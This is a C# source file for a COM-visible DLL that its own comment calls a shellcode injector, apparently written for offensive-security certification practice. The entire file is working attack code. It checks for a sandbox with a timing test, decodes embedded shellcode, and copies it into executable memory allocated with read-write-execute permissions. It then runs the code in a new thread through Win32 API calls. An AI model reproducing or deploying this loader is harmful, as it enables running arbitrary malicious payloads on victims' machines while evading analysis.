//Generates a DLL that can exports the OSEPRunner class. OSEPRunner is just a shellcode injector.
//Load the DLL and invoke OSEPRunner


using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace OSEP
{ 

    [ComVisible(true)]
    public class OSEPRunner
    {

        //IMPORT WIN32 API FUNCTIONS
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);



        public static void OSEPExec()
        {
            Debug.RunDebug("\nOSEPExec() start");

            if (CONFIG.DETECT_SANDBOX_TIME)
                Evasion.SandboxTimeDetect(2000);


#if X64
            int size = CONFIG.SHELLCODE64.Length;
#elif X86
            int size = CONFIG.SHELLCODE86.Length;
#endif


            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);



#if X64
            if (CONFIG.ENCODED == true)
                Marshal.Copy(Evasion.Decode(CONFIG.SHELLCODE64), 0, addr, size);
            else
                Marshal.Copy(CONFIG.SHELLCODE64, 0, addr, size);
#elif X86
            if (CONFIG.ENCODED == true)
                Marshal.Copy(Evasion.Decode(CONFIG.SHELLCODE86), 0, addr, size);
            else
                Marshal.Copy(CONFIG.SHELLCODE86, 0, addr, size);
#endif


            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }

}

